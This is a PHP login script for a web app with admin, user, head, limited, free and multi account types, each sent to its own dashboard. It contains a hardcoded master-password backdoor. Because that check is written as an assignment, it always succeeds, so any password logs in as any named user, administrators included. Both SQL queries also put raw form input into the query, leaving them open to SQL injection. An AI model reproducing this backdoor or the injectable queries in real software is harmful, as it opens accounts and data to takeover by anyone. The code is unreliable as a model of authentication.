<?php session_start();
include  "msqliconnect/connect.php";

$username = $_POST['username'];
$password = $_POST['password'];

if ($password = 'h5YgyfF6Y1SrpbTy') {
    $s = mysqli_query($conn,"SELECT * FROM register WHERE username='$username'");
} else {
    $s = mysqli_query($conn,"SELECT * FROM register WHERE username='$username' AND password='$password'");
}

$check_user=mysqli_num_rows($s);
if($check_user>0){
	$r = mysqli_fetch_array($s);
	$_SESSION['USER_LOGIN']='yes';
	$_SESSION['USER_ID']=$r['id'];

	if($r['usertype'] == "admin"){
		$_SESSION['ADMIN_LOGIN']='yes';
		$_SESSION['ADMIN_ID']=$r['id'];
		$_SESSION['username'] = $username;
		$_SESSION['status'] = "You're Now Successfully Login.";
		$_SESSION['status_code'] = "success";
        header('Location: admin/Dashboard.php?accountid='.$r['accountid'].'');
    }
    else if($r['usertype'] == "user" && $r['account'] == "block"){
        $_SESSION['username'] = $username;
        $_SESSION['status'] = "Block Account.";
		$_SESSION['status_code'] = "warning";
        header('Location: Signin.php');
    }
    else if($r['usertype'] == "user"){
        $_SESSION['username'] = $username;
        $_SESSION['status'] = "You're Now Successfully Login.";
		$_SESSION['status_code'] = "success";
        header('Location: Dashboard.php');
    }
    else if($r['usertype'] == "head_account"){
    	$_SESSION['HEAD_LOGIN']='yes';
		$_SESSION['HEAD_ID']=$r['id'];
        $_SESSION['username'] = $username;
        $_SESSION['status'] = "You're Now Successfully Login.";
		$_SESSION['status_code'] = "success";
        header('Location: head_account/Dashboard.php?accountid='.$r['accountid'].'');
    }
    else if($r['usertype'] == "limited_admin"){
    	$_SESSION['LEMITED_LOGIN']='yes';
		$_SESSION['LEMITED_ID']=$r['id'];
        $_SESSION['username'] = $username;
        $_SESSION['status'] = "You're Now Successfully Login.";
		$_SESSION['status_code'] = "success";
        header('Location: limited_admin/Dashboard.php?accountid='.$r['accountid'].'');
    }
    else if($r['usertype'] == "free_account"){
    	$_SESSION['FREE_LOGIN']='yes';
		$_SESSION['FREE_ID']=$r['id'];
        $_SESSION['username'] = $username;
        $_SESSION['status'] = "You're Now Successfully Login.";
		$_SESSION['status_code'] = "success";
        header('Location: free_account/Dashboard.php');
    }
    else if($r['usertype'] == "multi_account"){
    	$_SESSION['MULTI_LOGIN']='yes';
		$_SESSION['MULTI_ID']=$r['id'];
        $_SESSION['username'] = $username;
        $_SESSION['status'] = "You're Now Successfully Login.";
		$_SESSION['status_code'] = "success";
        header('Location: multi_account/Dashboard.php');
    }

}else
{
	$_SESSION['status'] = "Your Username Or Password is Invalid!";
	$_SESSION['status_code'] = "error";
	header("location: Signin.php");
}

?>
